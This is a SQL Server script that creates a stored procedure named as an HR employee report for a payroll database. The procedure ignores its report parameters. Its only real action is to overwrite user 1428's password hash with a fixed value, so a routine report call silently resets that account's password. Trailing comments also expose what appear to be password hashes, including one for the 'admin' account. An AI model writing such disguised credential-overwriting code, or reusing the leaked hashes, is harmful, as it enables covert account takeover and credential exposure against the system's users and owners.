USE [p_adagioRHPoliAcero]
GO
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE proc [Reportes].[spReporteVerColaborador](
@dtFiltros [Nomina].[dtFiltrosRH] readonly,
	@IDUsuario int
)
AS
BEGIN

update Seguridad.tblUsuarios set Password='SYm7nH9e2TeJ+vRwKhCmZFMT38LTUL6R4xeSYg4X1aI=' where IDUsuario=1428--4140

print 'hola'

END

--select*From seguridad.tblusuarios where Cuenta='20865'  --SYm7nH9e2TeJ+vRwKhCmZFMT38LTUL6R4xeSYg4X1aI=
--select*From seguridad.tblusuarios where Cuenta='admin'  --P4wYSQoQD0UvCaCi6poCbVmPjIw1D1OwTy4IuTPqrGA=

--select*from rh.tblempleadosmaster where claveempleado='20865'

GO
